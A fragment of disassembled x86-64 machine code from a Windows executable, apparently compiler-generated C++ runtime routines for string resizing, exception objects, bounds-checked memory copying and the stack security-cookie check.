   1400016bf:	42 c6 04 1b 00       	movb   $0x0,(%rbx,%r11,1)
   1400016c4:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400016c9:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   1400016ce:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   1400016d3:	48 8b c7             	mov    %rdi,%rax
   1400016d6:	48 83 c4 20          	add    $0x20,%rsp
   1400016da:	5f                   	pop    %rdi
   1400016db:	c3                   	ret
   1400016dc:	cc                   	int3
   1400016dd:	cc                   	int3
   1400016de:	cc                   	int3
   1400016df:	cc                   	int3
   1400016e0:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   1400016e5:	48 89 6c 24 18       	mov    %rbp,0x18(%rsp)
   1400016ea:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   1400016ef:	41 54                	push   %r12
   1400016f1:	48 83 ec 20          	sub    $0x20,%rsp
   1400016f5:	49 8b e9             	mov    %r9,%rbp
   1400016f8:	4d 8b e0             	mov    %r8,%r12
   1400016fb:	48 8b fa             	mov    %rdx,%rdi
   1400016fe:	48 8b d9             	mov    %rcx,%rbx
   140001701:	4c 39 42 18          	cmp    %r8,0x18(%rdx)
   140001705:	73 05                	jae    0x14000170c
   140001707:	e8 d0 8c 00 00       	call   0x14000a3dc
   14000170c:	48 8b 47 18          	mov    0x18(%rdi),%rax
   140001710:	48 8b 4b 18          	mov    0x18(%rbx),%rcx
   140001714:	49 2b c4             	sub    %r12,%rax
   140001717:	48 3b c5             	cmp    %rbp,%rax
   14000171a:	48 0f 42 e8          	cmovb  %rax,%rbp
   14000171e:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
   140001722:	48 2b c1             	sub    %rcx,%rax
   140001725:	48 3b c5             	cmp    %rbp,%rax
   140001728:	76 09                	jbe    0x140001733
   14000172a:	48 8d 04 29          	lea    (%rcx,%rbp,1),%rax
   14000172e:	48 3b c1             	cmp    %rcx,%rax
   140001731:	73 05                	jae    0x140001738
   140001733:	e8 3c 8c 00 00       	call   0x14000a374
   140001738:	48 85 ed             	test   %rbp,%rbp
   14000173b:	0f 84 cc 00 00 00    	je     0x14000180d
   140001741:	48 89 74 24 30       	mov    %rsi,0x30(%rsp)
   140001746:	48 8b 73 18          	mov    0x18(%rbx),%rsi
   14000174a:	48 03 f5             	add    %rbp,%rsi
   14000174d:	48 83 fe fe          	cmp    $0xfffffffffffffffe,%rsi
   140001751:	76 05                	jbe    0x140001758
   140001753:	e8 1c 8c 00 00       	call   0x14000a374
   140001758:	48 8b 43 20          	mov    0x20(%rbx),%rax
   14000175c:	48 3b c6             	cmp    %rsi,%rax
   14000175f:	73 25                	jae    0x140001786
   140001761:	4c 8b 43 18          	mov    0x18(%rbx),%r8
   140001765:	48 8b d6             	mov    %rsi,%rdx
   140001768:	48 8b cb             	mov    %rbx,%rcx
   14000176b:	e8 b0 00 00 00       	call   0x140001820
   140001770:	48 85 f6             	test   %rsi,%rsi
   140001773:	0f 84 8f 00 00 00    	je     0x140001808
   140001779:	48 83 7f 20 10       	cmpq   $0x10,0x20(%rdi)
   14000177e:	72 40                	jb     0x1400017c0
   140001780:	48 8b 4f 08          	mov    0x8(%rdi),%rcx
   140001784:	eb 3e                	jmp    0x1400017c4
   140001786:	48 85 f6             	test   %rsi,%rsi
   140001789:	75 e5                	jne    0x140001770
   14000178b:	48 89 73 18          	mov    %rsi,0x18(%rbx)
   14000178f:	48 83 f8 10          	cmp    $0x10,%rax
   140001793:	72 06                	jb     0x14000179b
   140001795:	48 8b 43 08          	mov    0x8(%rbx),%rax
   140001799:	eb 04                	jmp    0x14000179f
   14000179b:	48 8d 43 08          	lea    0x8(%rbx),%rax
   14000179f:	c6 00 00             	movb   $0x0,(%rax)
   1400017a2:	48 8b c3             	mov    %rbx,%rax
   1400017a5:	48 8b 74 24 30       	mov    0x30(%rsp),%rsi
   1400017aa:	48 8b 5c 24 38       	mov    0x38(%rsp),%rbx
   1400017af:	48 8b 6c 24 40       	mov    0x40(%rsp),%rbp
   1400017b4:	48 8b 7c 24 48       	mov    0x48(%rsp),%rdi
   1400017b9:	48 83 c4 20          	add    $0x20,%rsp
   1400017bd:	41 5c                	pop    %r12
   1400017bf:	c3                   	ret
   1400017c0:	48 8d 4f 08          	lea    0x8(%rdi),%rcx
   1400017c4:	48 8b 53 20          	mov    0x20(%rbx),%rdx
   1400017c8:	48 83 fa 10          	cmp    $0x10,%rdx
   1400017cc:	72 0a                	jb     0x1400017d8
   1400017ce:	4c 8b 4b 08          	mov    0x8(%rbx),%r9
   1400017d2:	48 8d 7b 08          	lea    0x8(%rbx),%rdi
   1400017d6:	eb 07                	jmp    0x1400017df
   1400017d8:	48 8d 7b 08          	lea    0x8(%rbx),%rdi
   1400017dc:	4c 8b cf             	mov    %rdi,%r9
   1400017df:	48 8b 43 18          	mov    0x18(%rbx),%rax
   1400017e3:	4e 8d 04 21          	lea    (%rcx,%r12,1),%r8
   1400017e7:	4a 8d 0c 08          	lea    (%rax,%r9,1),%rcx
   1400017eb:	48 2b d0             	sub    %rax,%rdx
   1400017ee:	4c 8b cd             	mov    %rbp,%r9
   1400017f1:	e8 02 04 00 00       	call   0x140001bf8
   1400017f6:	48 83 7b 20 10       	cmpq   $0x10,0x20(%rbx)
   1400017fb:	48 89 73 18          	mov    %rsi,0x18(%rbx)
   1400017ff:	72 03                	jb     0x140001804
   140001801:	48 8b 3f             	mov    (%rdi),%rdi
   140001804:	c6 04 37 00          	movb   $0x0,(%rdi,%rsi,1)
   140001808:	48 8b c3             	mov    %rbx,%rax
   14000180b:	eb 98                	jmp    0x1400017a5
   14000180d:	48 8b c3             	mov    %rbx,%rax
   140001810:	eb 98                	jmp    0x1400017aa
   140001812:	cc                   	int3
   140001813:	cc                   	int3
   140001814:	cc                   	int3
   140001815:	cc                   	int3
   140001816:	cc                   	int3
   140001817:	cc                   	int3
   140001818:	cc                   	int3
   140001819:	cc                   	int3
   14000181a:	cc                   	int3
   14000181b:	cc                   	int3
   14000181c:	cc                   	int3
   14000181d:	cc                   	int3
   14000181e:	cc                   	int3
   14000181f:	cc                   	int3
   140001820:	4c 89 44 24 18       	mov    %r8,0x18(%rsp)
   140001825:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   14000182a:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   14000182f:	53                   	push   %rbx
   140001830:	56                   	push   %rsi
   140001831:	57                   	push   %rdi
   140001832:	41 54                	push   %r12
   140001834:	48 83 ec 58          	sub    $0x58,%rsp
   140001838:	48 c7 44 24 28 fe ff 	movq   $0xfffffffffffffffe,0x28(%rsp)
   14000183f:	ff ff 
   140001841:	49 8b f0             	mov    %r8,%rsi
   140001844:	48 8b d9             	mov    %rcx,%rbx
   140001847:	48 8b fa             	mov    %rdx,%rdi
   14000184a:	48 83 cf 0f          	or     $0xf,%rdi
   14000184e:	48 83 ff fe          	cmp    $0xfffffffffffffffe,%rdi
   140001852:	76 05                	jbe    0x140001859
   140001854:	48 8b fa             	mov    %rdx,%rdi
   140001857:	eb 32                	jmp    0x14000188b
   140001859:	4c 8b 41 20          	mov    0x20(%rcx),%r8
   14000185d:	49 8b c8             	mov    %r8,%rcx
   140001860:	48 d1 e9             	shr    $1,%rcx
   140001863:	48 b8 ab aa aa aa aa 	movabs $0xaaaaaaaaaaaaaaab,%rax
   14000186a:	aa aa aa 
   14000186d:	48 f7 e7             	mul    %rdi
   140001870:	48 d1 ea             	shr    $1,%rdx
   140001873:	48 3b d1             	cmp    %rcx,%rdx
   140001876:	73 13                	jae    0x14000188b
   140001878:	48 c7 c0 fe ff ff ff 	mov    $0xfffffffffffffffe,%rax
   14000187f:	48 2b c1             	sub    %rcx,%rax
   140001882:	4c 3b c0             	cmp    %rax,%r8
   140001885:	77 04                	ja     0x14000188b
   140001887:	4a 8d 3c 01          	lea    (%rcx,%r8,1),%rdi
   14000188b:	48 8d 4f 01          	lea    0x1(%rdi),%rcx
   14000188f:	48 85 c9             	test   %rcx,%rcx
   140001892:	74 48                	je     0x1400018dc
   140001894:	33 d2                	xor    %edx,%edx
   140001896:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
   14000189a:	48 f7 f1             	div    %rcx
   14000189d:	48 83 f8 01          	cmp    $0x1,%rax
   1400018a1:	73 39                	jae    0x1400018dc
   1400018a3:	33 c9                	xor    %ecx,%ecx
   1400018a5:	48 89 8c 24 98 00 00 	mov    %rcx,0x98(%rsp)
   1400018ac:	00 
   1400018ad:	48 8d 94 24 98 00 00 	lea    0x98(%rsp),%rdx
   1400018b4:	00 
   1400018b5:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   1400018ba:	e8 b9 01 00 00       	call   0x140001a78
   1400018bf:	48 8d 05 a2 ca 00 00 	lea    0xcaa2(%rip),%rax        # 0x14000e368
   1400018c6:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   1400018cb:	48 8d 15 6e ff 00 00 	lea    0xff6e(%rip),%rdx        # 0x140011840
   1400018d2:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   1400018d7:	e8 24 1b 00 00       	call   0x140003400
   1400018dc:	e8 6f 04 00 00       	call   0x140001d50
   1400018e1:	4c 8b e0             	mov    %rax,%r12
   1400018e4:	eb 1d                	jmp    0x140001903
   1400018e6:	48 8b 9c 24 80 00 00 	mov    0x80(%rsp),%rbx
   1400018ed:	00 
   1400018ee:	48 8b b4 24 90 00 00 	mov    0x90(%rsp),%rsi
   1400018f5:	00 
   1400018f6:	48 8b bc 24 88 00 00 	mov    0x88(%rsp),%rdi
   1400018fd:	00 
   1400018fe:	4c 8b 64 24 20       	mov    0x20(%rsp),%r12
   140001903:	48 85 f6             	test   %rsi,%rsi
   140001906:	74 20                	je     0x140001928
   140001908:	48 83 7b 20 10       	cmpq   $0x10,0x20(%rbx)
   14000190d:	72 06                	jb     0x140001915
   14000190f:	4c 8b 43 08          	mov    0x8(%rbx),%r8
   140001913:	eb 04                	jmp    0x140001919
   140001915:	4c 8d 43 08          	lea    0x8(%rbx),%r8
   140001919:	48 8d 57 01          	lea    0x1(%rdi),%rdx
   14000191d:	4c 8b ce             	mov    %rsi,%r9
   140001920:	49 8b cc             	mov    %r12,%rcx
   140001923:	e8 d0 02 00 00       	call   0x140001bf8
   140001928:	48 83 7b 20 10       	cmpq   $0x10,0x20(%rbx)
   14000192d:	72 09                	jb     0x140001938
   14000192f:	48 8b 4b 08          	mov    0x8(%rbx),%rcx
   140001933:	e8 b8 02 00 00       	call   0x140001bf0
   140001938:	48 8d 43 08          	lea    0x8(%rbx),%rax
   14000193c:	c6 00 00             	movb   $0x0,(%rax)
   14000193f:	4c 89 20             	mov    %r12,(%rax)
   140001942:	48 89 7b 20          	mov    %rdi,0x20(%rbx)
   140001946:	48 89 73 18          	mov    %rsi,0x18(%rbx)
   14000194a:	48 83 ff 10          	cmp    $0x10,%rdi
   14000194e:	49 0f 43 c4          	cmovae %r12,%rax
   140001952:	c6 04 30 00          	movb   $0x0,(%rax,%rsi,1)
   140001956:	48 83 c4 58          	add    $0x58,%rsp
   14000195a:	41 5c                	pop    %r12
   14000195c:	5f                   	pop    %rdi
   14000195d:	5e                   	pop    %rsi
   14000195e:	5b                   	pop    %rbx
   14000195f:	c3                   	ret
   140001960:	48 83 ec 48          	sub    $0x48,%rsp
   140001964:	4c 8b c2             	mov    %rdx,%r8
   140001967:	48 85 d2             	test   %rdx,%rdx
   14000196a:	75 0d                	jne    0x140001979
   14000196c:	49 8b c8             	mov    %r8,%rcx
   14000196f:	e8 dc 03 00 00       	call   0x140001d50
   140001974:	48 83 c4 48          	add    $0x48,%rsp
   140001978:	c3                   	ret
   140001979:	33 d2                	xor    %edx,%edx
   14000197b:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
   14000197f:	49 f7 f0             	div    %r8
   140001982:	48 83 f8 01          	cmp    $0x1,%rax
   140001986:	73 e4                	jae    0x14000196c
   140001988:	45 33 c0             	xor    %r8d,%r8d
   14000198b:	48 8d 54 24 58       	lea    0x58(%rsp),%rdx
   140001990:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140001995:	4c 89 44 24 58       	mov    %r8,0x58(%rsp)
   14000199a:	e8 d9 00 00 00       	call   0x140001a78
   14000199f:	4c 8d 1d c2 c9 00 00 	lea    0xc9c2(%rip),%r11        # 0x14000e368
   1400019a6:	48 8d 15 93 fe 00 00 	lea    0xfe93(%rip),%rdx        # 0x140011840
   1400019ad:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   1400019b2:	4c 89 5c 24 20       	mov    %r11,0x20(%rsp)
   1400019b7:	e8 44 1a 00 00       	call   0x140003400
   1400019bc:	cc                   	int3
   1400019bd:	cc                   	int3
   1400019be:	cc                   	int3
   1400019bf:	cc                   	int3
   1400019c0:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   1400019c5:	4c 89 44 24 18       	mov    %r8,0x18(%rsp)
   1400019ca:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   1400019cf:	48 83 ec 28          	sub    $0x28,%rsp
   1400019d3:	4c 8b c2             	mov    %rdx,%r8
   1400019d6:	4c 8d 4c 24 40       	lea    0x40(%rsp),%r9
   1400019db:	ba 04 01 00 00       	mov    $0x104,%edx
   1400019e0:	e8 f3 0a 00 00       	call   0x1400024d8
   1400019e5:	48 83 c4 28          	add    $0x28,%rsp
   1400019e9:	c3                   	ret
   1400019ea:	cc                   	int3
   1400019eb:	cc                   	int3
   1400019ec:	cc                   	int3
   1400019ed:	cc                   	int3
   1400019ee:	cc                   	int3
   1400019ef:	cc                   	int3
   1400019f0:	40 53                	rex push %rbx
   1400019f2:	48 83 ec 20          	sub    $0x20,%rsp
   1400019f6:	48 8b d9             	mov    %rcx,%rbx
   1400019f9:	e8 0a 01 00 00       	call   0x140001b08
   1400019fe:	4c 8d 1d 63 c9 00 00 	lea    0xc963(%rip),%r11        # 0x14000e368
   140001a05:	4c 89 1b             	mov    %r11,(%rbx)
   140001a08:	48 8b c3             	mov    %rbx,%rax
   140001a0b:	48 83 c4 20          	add    $0x20,%rsp
   140001a0f:	5b                   	pop    %rbx
   140001a10:	c3                   	ret
   140001a11:	cc                   	int3
   140001a12:	ff 25 10 c6 00 00    	jmp    *0xc610(%rip)        # 0x14000e028
   140001a18:	ff 25 12 c6 00 00    	jmp    *0xc612(%rip)        # 0x14000e030
   140001a1e:	ff 25 14 c6 00 00    	jmp    *0xc614(%rip)        # 0x14000e038
   140001a24:	cc                   	int3
   140001a25:	cc                   	int3
   140001a26:	cc                   	int3
   140001a27:	cc                   	int3
   140001a28:	cc                   	int3
   140001a29:	cc                   	int3
   140001a2a:	cc                   	int3
   140001a2b:	cc                   	int3
   140001a2c:	cc                   	int3
   140001a2d:	cc                   	int3
   140001a2e:	cc                   	int3
   140001a2f:	cc                   	int3
   140001a30:	cc                   	int3
   140001a31:	cc                   	int3
   140001a32:	cc                   	int3
   140001a33:	cc                   	int3
   140001a34:	cc                   	int3
   140001a35:	cc                   	int3
   140001a36:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   140001a3d:	00 00 00 
   140001a40:	48 3b 0d 01 16 01 00 	cmp    0x11601(%rip),%rcx        # 0x140013048
   140001a47:	75 11                	jne    0x140001a5a
   140001a49:	48 c1 c1 10          	rol    $0x10,%rcx
   140001a4d:	66 f7 c1 ff ff       	test   $0xffff,%cx
   140001a52:	75 02                	jne    0x140001a56
   140001a54:	f3 c3                	repz ret
   140001a56:	48 c1 c9 10          	ror    $0x10,%rcx
   140001a5a:	e9 81 0c 00 00       	jmp    0x1400026e0
   140001a5f:	cc                   	int3
   140001a60:	48 83 61 08 00       	andq   $0x0,0x8(%rcx)
   140001a65:	83 61 10 00          	andl   $0x0,0x10(%rcx)
   140001a69:	48 8d 05 b8 c8 00 00 	lea    0xc8b8(%rip),%rax        # 0x14000e328
   140001a70:	48 89 01             	mov    %rax,(%rcx)
   140001a73:	48 8b c1             	mov    %rcx,%rax
   140001a76:	c3                   	ret
   140001a77:	cc                   	int3
   140001a78:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140001a7d:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   140001a82:	57                   	push   %rdi
   140001a83:	48 83 ec 20          	sub    $0x20,%rsp
   140001a87:	48 8d 05 9a c8 00 00 	lea    0xc89a(%rip),%rax        # 0x14000e328
   140001a8e:	48 8b d9             	mov    %rcx,%rbx
   140001a91:	48 8b fa             	mov    %rdx,%rdi
   140001a94:	48 89 01             	mov    %rax,(%rcx)
   140001a97:	48 8b 0a             	mov    (%rdx),%rcx
   140001a9a:	48 85 c9             	test   %rcx,%rcx
   140001a9d:	74 2b                	je     0x140001aca
   140001a9f:	e8 cc 0e 00 00       	call   0x140002970
   140001aa4:	48 8b f0             	mov    %rax,%rsi
   140001aa7:	48 8d 48 01          	lea    0x1(%rax),%rcx
   140001aab:	e8 f0 0d 00 00       	call   0x1400028a0
   140001ab0:	48 89 43 08          	mov    %rax,0x8(%rbx)
   140001ab4:	48 85 c0             	test   %rax,%rax
   140001ab7:	74 16                	je     0x140001acf
   140001ab9:	4c 8b 07             	mov    (%rdi),%r8
   140001abc:	48 8d 56 01          	lea    0x1(%rsi),%rdx
   140001ac0:	48 8b c8             	mov    %rax,%rcx
   140001ac3:	e8 64 0d 00 00       	call   0x14000282c
   140001ac8:	eb 05                	jmp    0x140001acf
   140001aca:	48 83 63 08 00       	andq   $0x0,0x8(%rbx)
   140001acf:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   140001ad4:	c7 43 10 01 00 00 00 	movl   $0x1,0x10(%rbx)
   140001adb:	48 8b c3             	mov    %rbx,%rax
   140001ade:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140001ae3:	48 83 c4 20          	add    $0x20,%rsp
   140001ae7:	5f                   	pop    %rdi
   140001ae8:	c3                   	ret
   140001ae9:	cc                   	int3
   140001aea:	cc                   	int3
   140001aeb:	cc                   	int3
   140001aec:	48 8d 05 35 c8 00 00 	lea    0xc835(%rip),%rax        # 0x14000e328
   140001af3:	48 89 01             	mov    %rax,(%rcx)
   140001af6:	48 8b 02             	mov    (%rdx),%rax
   140001af9:	83 61 10 00          	andl   $0x0,0x10(%rcx)
   140001afd:	48 89 41 08          	mov    %rax,0x8(%rcx)
   140001b01:	48 8b c1             	mov    %rcx,%rax
   140001b04:	c3                   	ret
   140001b05:	cc                   	int3
   140001b06:	cc                   	int3
   140001b07:	cc                   	int3
   140001b08:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140001b0d:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   140001b12:	57                   	push   %rdi
   140001b13:	48 83 ec 20          	sub    $0x20,%rsp
   140001b17:	48 8d 05 0a c8 00 00 	lea    0xc80a(%rip),%rax        # 0x14000e328
   140001b1e:	48 8b fa             	mov    %rdx,%rdi
   140001b21:	48 8b d9             	mov    %rcx,%rbx
   140001b24:	48 89 01             	mov    %rax,(%rcx)
   140001b27:	8b 42 10             	mov    0x10(%rdx),%eax
   140001b2a:	89 41 10             	mov    %eax,0x10(%rcx)
   140001b2d:	85 c0                	test   %eax,%eax
   140001b2f:	74 3c                	je     0x140001b6d
   140001b31:	48 8b 4a 08          	mov    0x8(%rdx),%rcx
   140001b35:	48 85 c9             	test   %rcx,%rcx
   140001b38:	74 2c                	je     0x140001b66
   140001b3a:	e8 31 0e 00 00       	call   0x140002970
   140001b3f:	48 8b f0             	mov    %rax,%rsi
   140001b42:	48 8d 48 01          	lea    0x1(%rax),%rcx
   140001b46:	e8 55 0d 00 00       	call   0x1400028a0
   140001b4b:	48 89 43 08          	mov    %rax,0x8(%rbx)
   140001b4f:	48 85 c0             	test   %rax,%rax
   140001b52:	74 21                	je     0x140001b75
   140001b54:	4c 8b 47 08          	mov    0x8(%rdi),%r8
   140001b58:	48 8d 56 01          	lea    0x1(%rsi),%rdx
   140001b5c:	48 8b c8             	mov    %rax,%rcx
   140001b5f:	e8 c8 0c 00 00       	call   0x14000282c
   140001b64:	eb 0f                	jmp    0x140001b75
   140001b66:	48 83 63 08 00       	andq   $0x0,0x8(%rbx)
   140001b6b:	eb 08                	jmp    0x140001b75
   140001b6d:	48 8b 42 08          	mov    0x8(%rdx),%rax
   140001b71:	48 89 41 08          	mov    %rax,0x8(%rcx)
   140001b75:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   140001b7a:	48 8b c3             	mov    %rbx,%rax
   140001b7d:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140001b82:	48 83 c4 20          	add    $0x20,%rsp
   140001b86:	5f                   	pop    %rdi
   140001b87:	c3                   	ret
   140001b88:	48 83 ec 28          	sub    $0x28,%rsp
   140001b8c:	83 79 10 00          	cmpl   $0x0,0x10(%rcx)
   140001b90:	48 8d 05 91 c7 00 00 	lea    0xc791(%rip),%rax        # 0x14000e328
   140001b97:	48 89 01             	mov    %rax,(%rcx)
   140001b9a:	74 09                	je     0x140001ba5
   140001b9c:	48 8b 49 08          	mov    0x8(%rcx),%rcx
   140001ba0:	e8 73 0e 00 00       	call   0x140002a18
   140001ba5:	48 83 c4 28          	add    $0x28,%rsp
   140001ba9:	c3                   	ret
   140001baa:	cc                   	int3
   140001bab:	cc                   	int3
   140001bac:	48 8b 41 08          	mov    0x8(%rcx),%rax
   140001bb0:	48 85 c0             	test   %rax,%rax
   140001bb3:	75 07                	jne    0x140001bbc
   140001bb5:	48 8d 05 7c c7 00 00 	lea    0xc77c(%rip),%rax        # 0x14000e338
   140001bbc:	c3                   	ret
   140001bbd:	cc                   	int3
   140001bbe:	cc                   	int3
   140001bbf:	cc                   	int3
   140001bc0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140001bc5:	57                   	push   %rdi
   140001bc6:	48 83 ec 20          	sub    $0x20,%rsp
   140001bca:	8b da                	mov    %edx,%ebx
   140001bcc:	48 8b f9             	mov    %rcx,%rdi
   140001bcf:	e8 b4 ff ff ff       	call   0x140001b88
   140001bd4:	f6 c3 01             	test   $0x1,%bl
   140001bd7:	74 08                	je     0x140001be1
   140001bd9:	48 8b cf             	mov    %rdi,%rcx
   140001bdc:	e8 0f 00 00 00       	call   0x140001bf0
   140001be1:	48 8b c7             	mov    %rdi,%rax
   140001be4:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140001be9:	48 83 c4 20          	add    $0x20,%rsp
   140001bed:	5f                   	pop    %rdi
   140001bee:	c3                   	ret
   140001bef:	cc                   	int3
   140001bf0:	e9 23 0e 00 00       	jmp    0x140002a18
   140001bf5:	cc                   	int3
   140001bf6:	cc                   	int3
   140001bf7:	cc                   	int3
   140001bf8:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140001bfd:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   140001c02:	57                   	push   %rdi
   140001c03:	48 83 ec 30          	sub    $0x30,%rsp
   140001c07:	49 8b d9             	mov    %r9,%rbx
   140001c0a:	49 8b f0             	mov    %r8,%rsi
   140001c0d:	48 8b fa             	mov    %rdx,%rdi
   140001c10:	4d 85 c9             	test   %r9,%r9
   140001c13:	75 04                	jne    0x140001c19
   140001c15:	33 c0                	xor    %eax,%eax
   140001c17:	eb 66                	jmp    0x140001c7f
   140001c19:	48 85 c9             	test   %rcx,%rcx
   140001c1c:	75 25                	jne    0x140001c43
   140001c1e:	e8 81 14 00 00       	call   0x1400030a4
   140001c23:	bb 16 00 00 00       	mov    $0x16,%ebx
   140001c28:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   140001c2e:	45 33 c9             	xor    %r9d,%r9d
   140001c31:	45 33 c0             	xor    %r8d,%r8d
   140001c34:	33 d2                	xor    %edx,%edx
   140001c36:	33 c9                	xor    %ecx,%ecx
   140001c38:	89 18                	mov    %ebx,(%rax)
   140001c3a:	e8 95 13 00 00       	call   0x140002fd4
   140001c3f:	8b c3                	mov    %ebx,%eax
   140001c41:	eb 3c                	jmp    0x140001c7f
   140001c43:	4d 85 c0             	test   %r8,%r8
   140001c46:	74 12                	je     0x140001c5a
   140001c48:	48 3b d3             	cmp    %rbx,%rdx
   140001c4b:	72 0d                	jb     0x140001c5a
   140001c4d:	4c 8b c3             	mov    %rbx,%r8
   140001c50:	48 8b d6             	mov    %rsi,%rdx
   140001c53:	e8 18 0f 00 00       	call   0x140002b70
   140001c58:	eb bb                	jmp    0x140001c15
   140001c5a:	4c 8b c2             	mov    %rdx,%r8
   140001c5d:	33 d2                	xor    %edx,%edx
   140001c5f:	e8 0c 0e 00 00       	call   0x140002a70
   140001c64:	48 85 f6             	test   %rsi,%rsi
   140001c67:	74 b5                	je     0x140001c1e
   140001c69:	48 3b fb             	cmp    %rbx,%rdi
   140001c6c:	73 0c                	jae    0x140001c7a
   140001c6e:	e8 31 14 00 00       	call   0x1400030a4
   140001c73:	bb 22 00 00 00       	mov    $0x22,%ebx
   140001c78:	eb ae                	jmp    0x140001c28
   140001c7a:	b8 16 00 00 00       	mov    $0x16,%eax
   140001c7f:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   140001c84:	48 8b 74 24 48       	mov    0x48(%rsp),%rsi
   140001c89:	48 83 c4 30          	add    $0x30,%rsp
   140001c8d:	5f                   	pop    %rdi
   140001c8e:	c3                   	ret
   140001c8f:	cc                   	int3
   140001c90:	40 53                	rex push %rbx
   140001c92:	48 83 ec 30          	sub    $0x30,%rsp
   140001c96:	49 8b c0             	mov    %r8,%rax
   140001c99:	4d 85 c9             	test   %r9,%r9
   140001c9c:	74 4b                	je     0x140001ce9
   140001c9e:	48 85 c9             	test   %rcx,%rcx
   140001ca1:	75 25                	jne    0x140001cc8
   140001ca3:	e8 fc 13 00 00       	call   0x1400030a4
   140001ca8:	bb 16 00 00 00       	mov    $0x16,%ebx
   140001cad:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   140001cb3:	45 33 c9             	xor    %r9d,%r9d
   140001cb6:	45 33 c0             	xor    %r8d,%r8d
   140001cb9:	33 d2                	xor    %edx,%edx
   140001cbb:	33 c9                	xor    %ecx,%ecx
   140001cbd:	89 18                	mov    %ebx,(%rax)
   140001cbf:	e8 10 13 00 00       	call   0x140002fd4
   140001cc4:	8b c3                	mov    %ebx,%eax
   140001cc6:	eb 23                	jmp    0x140001ceb
   140001cc8:	48 85 c0             	test   %rax,%rax
   140001ccb:	74 d6                	je     0x140001ca3
   140001ccd:	49 3b d1             	cmp    %r9,%rdx
   140001cd0:	73 0c                	jae    0x140001cde
   140001cd2:	e8 cd 13 00 00       	call   0x1400030a4
   140001cd7:	bb 22 00 00 00       	mov    $0x22,%ebx
   140001cdc:	eb cf                	jmp    0x140001cad
   140001cde:	4d 8b c1             	mov    %r9,%r8
   140001ce1:	48 8b d0             	mov    %rax,%rdx
   140001ce4:	e8 87 0e 00 00       	call   0x140002b70
   140001ce9:	33 c0                	xor    %eax,%eax
   140001ceb:	48 83 c4 30          	add    $0x30,%rsp
   140001cef:	5b                   	pop    %rbx
   140001cf0:	c3                   	ret
   140001cf1:	cc                   	int3
   140001cf2:	cc                   	int3
   140001cf3:	cc                   	int3
   140001cf4:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140001cf9:	57                   	push   %rdi
   140001cfa:	48 83 ec 20          	sub    $0x20,%rsp
   140001cfe:	48 8d 05 53 c6 00 00 	lea    0xc653(%rip),%rax        # 0x14000e358
   140001d05:	8b da                	mov    %edx,%ebx
   140001d07:	48 8b f9             	mov    %rcx,%rdi
   140001d0a:	48 89 01             	mov    %rax,(%rcx)
   140001d0d:	e8 1a 14 00 00       	call   0x14000312c
   140001d12:	f6 c3 01             	test   $0x1,%bl
   140001d15:	74 08                	je     0x140001d1f
   140001d17:	48 8b cf             	mov    %rdi,%rcx
   140001d1a:	e8 d1 fe ff ff       	call   0x140001bf0
   140001d1f:	48 8b c7             	mov    %rdi,%rax
   140001d22:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140001d27:	48 83 c4 20          	add    $0x20,%rsp
   140001d2b:	5f                   	pop    %rdi
   140001d2c:	c3                   	ret
   140001d2d:	cc                   	int3
   140001d2e:	cc                   	int3
   140001d2f:	cc                   	int3
   140001d30:	48 83 ec 28          	sub    $0x28,%rsp
   140001d34:	48 8b c2             	mov    %rdx,%rax
   140001d37:	48 8d 51 11          	lea    0x11(%rcx),%rdx
   140001d3b:	48 8d 48 11          	lea    0x11(%rax),%rcx
   140001d3f:	e8 6c 14 00 00       	call   0x1400031b0
   140001d44:	33 c9                	xor    %ecx,%ecx
   140001d46:	3b c1                	cmp    %ecx,%eax
   140001d48:	0f 94 c0             	sete   %al
   140001d4b:	48 83 c4 28          	add    $0x28,%rsp
   140001d4f:	c3                   	ret
   140001d50:	40 53                	rex push %rbx
   140001d52:	48 83 ec 40          	sub    $0x40,%rsp
   140001d56:	48 8b d9             	mov    %rcx,%rbx
   140001d59:	eb 0f                	jmp    0x140001d6a
   140001d5b:	48 8b cb             	mov    %rbx,%rcx
   140001d5e:	e8 69 16 00 00       	call   0x1400033cc
   140001d63:	85 c0                	test   %eax,%eax
   140001d65:	74 13                	je     0x140001d7a
   140001d67:	48 8b cb             	mov    %rbx,%rcx
   140001d6a:	e8 31 0b 00 00       	call   0x1400028a0
   140001d6f:	48 85 c0             	test   %rax,%rax
   140001d72:	74 e7                	je     0x140001d5b
   140001d74:	48 83 c4 40          	add    $0x40,%rsp
   140001d78:	5b                   	pop    %rbx
   140001d79:	c3                   	ret
   140001d7a:	8b 05 38 28 01 00    	mov    0x12838(%rip),%eax        # 0x1400145b8
